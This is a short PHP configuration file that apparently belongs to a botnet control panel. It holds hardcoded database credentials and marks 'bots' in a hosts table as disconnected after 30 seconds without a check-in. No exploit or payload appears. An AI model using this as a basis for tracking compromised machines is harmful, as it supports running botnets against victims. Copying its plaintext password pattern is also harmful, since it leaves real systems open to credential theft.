<?php
# configuration file
$downloadsPath = "";

# Don't change
$dbHost = "127.0.0.1";

# Don't change
$dbName = "a_db";

# Don't change
$dbUser = "a_user";

# Change
$dbPass = "oOSSWrsYARnf";

$dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));

# Reset connected bot if date += 30 secondes
$timezone  = 1;
$date = gmdate("Y-m-d H:i:s", (time() + 3600*($timezone+date("I"))) - 30);

$statement = $dbConnection->prepare("UPDATE hosts SET status = 'disconnected' WHERE date < :date");
$statement->bindValue(':date', $date);
$statement->execute();

$date = gmdate("Y-m-d H:i:s", (time() + 3600*($timezone+date("I"))));
$dbConnection = NULL;
?>
